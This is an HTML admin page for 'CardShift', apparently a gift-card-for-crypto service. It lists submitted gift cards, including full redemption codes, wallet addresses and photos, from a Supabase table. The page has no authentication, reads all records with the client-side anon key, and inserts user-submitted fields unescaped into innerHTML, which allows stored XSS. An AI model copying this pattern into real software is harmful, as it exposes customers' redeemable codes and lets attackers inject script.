<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CardShift Admin</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <script src="js/config.js"></script>
    <style>
        body {
            background: #0a0e1a;
            font-family: Arial, sans-serif;
            color: white;
            padding: 20px;
        }
        .card {
            background: rgba(255,255,255,0.1);
            border-radius: 10px;
            padding: 15px;
            margin-bottom: 10px;
        }
        .card-header {
            display: flex;
            justify-content: space-between;
            border-bottom: 1px solid #00e5ff;
            padding-bottom: 5px;
            margin-bottom: 10px;
        }
        .card-type {
            color: #00e5ff;
            font-weight: bold;
        }
        .stats {
            display: flex;
            gap: 20px;
            margin-bottom: 20px;
        }
        .stat-box {
            background: rgba(0,229,255,0.1);
            padding: 10px 20px;
            border-radius: 8px;
        }
        button {
            background: #00e5ff;
            border: none;
            padding: 8px 16px;
            border-radius: 5px;
            cursor: pointer;
            margin-bottom: 20px;
        }
        img {
            max-width: 200px;
            border-radius: 5px;
            margin-top: 10px;
        }
        .live-badge {
            background: #4ade80;
            color: black;
            padding: 2px 8px;
            border-radius: 10px;
            font-size: 12px;
            display: inline-block;
            margin-left: 10px;
        }
        .error-message {
            background: rgba(255,59,48,0.2);
            border: 1px solid #ff3b30;
            padding: 15px;
            border-radius: 8px;
            margin: 20px 0;
            color: #ff6b6b;
        }
        .loading {
            text-align: center;
            padding: 40px;
            color: #6b7b9e;
        }
    </style>
</head>
<body>
    <h1>🛡️ CardShift Admin Panel <span class="live-badge">LIVE</span></h1>
    
    <div class="stats" id="stats">
        <div class="stat-box">Loading...</div>
    </div>
    
    <button onclick="loadData()">🔄 Refresh</button>
    
    <div id="giftCardsList">
        <div class="loading">Loading gift cards...</div>
    </div>

    <script>
        // Initialize Supabase with environment variables from config.js
        let supabaseClient = null;
        
        // Check if config is loaded
        if (typeof window.ENV !== 'undefined' && window.ENV.SUPABASE_URL && window.ENV.SUPABASE_ANON_KEY) {
            supabaseClient = window.supabase.createClient(
                window.ENV.SUPABASE_URL,
                window.ENV.SUPABASE_ANON_KEY
            );
            console.log('✅ Supabase initialized in admin panel');
        } else {
            console.warn('⚠️ Supabase config not found');
            document.getElementById('giftCardsList').innerHTML = '<div class="error-message">⚠️ Supabase configuration not found. Please check your config.js file.</div>';
            document.getElementById('stats').innerHTML = '<div class="stat-box">Error: No config</div>';
        }

        async function loadData() {
            if (!supabaseClient) {
                console.error('Supabase not initialized');
                return;
            }
            
            try {
                document.getElementById('giftCardsList').innerHTML = '<div class="loading">Loading gift cards...</div>';
                
                const { data: cards, error } = await supabaseClient
                    .from('gift_cards')
                    .select('*')
                    .order('created_at', { ascending: false });
                
                if (error) throw error;
                
                // Update stats
                const total = cards.length;
                const totalValue = cards.reduce((sum, card) => sum + (parseFloat(card.amount) || 0), 0);
                document.getElementById('stats').innerHTML = `
                    <div class="stat-box">📊 Total Cards: ${total}</div>
                    <div class="stat-box">💰 Total Value: $${totalValue.toLocaleString()}</div>
                `;
                
                // Display cards
                if (cards.length === 0) {
                    document.getElementById('giftCardsList').innerHTML = '<div class="loading">No submissions yet. Submit a gift card from the main site to see it here.</div>';
                    return;
                }
                
                document.getElementById('giftCardsList').innerHTML = cards.map(card => `
                    <div class="card">
                        <div class="card-header">
                            <span class="card-type">${card.card_type}</span>
                            <span>${card.currency}${card.amount}</span>
                        </div>
                        <div>💎 ${card.crypto}</div>
                        <div>🔑 ${card.wallet ? card.wallet.substring(0, 30) + '...' : 'No wallet'}</div>
                        ${card.card_code ? `<div>🔐 Code: ${card.card_code}</div>` : ''}
                        ${card.card_image ? `<img src="${card.card_image}" alt="Card photo" onclick="window.open(this.src)">` : ''}
                        <div style="font-size: 12px; margin-top: 8px;">📅 ${new Date(card.created_at).toLocaleString()}</div>
                    </div>
                `).join('');
                
            } catch (error) {
                console.error('Error loading data:', error);
                document.getElementById('giftCardsList').innerHTML = `<div class="error-message">❌ Error loading data: ${error.message}. Make sure you've created the gift_cards table in Supabase.</div>`;
            }
        }
        
        // Load data on page open if Supabase is initialized
        if (supabaseClient) {
            loadData();
            // Auto refresh every 10 seconds
            setInterval(loadData, 10000);
        }
        
        // Make functions global
        window.loadData = loadData;
    </script>
</body>
</html>
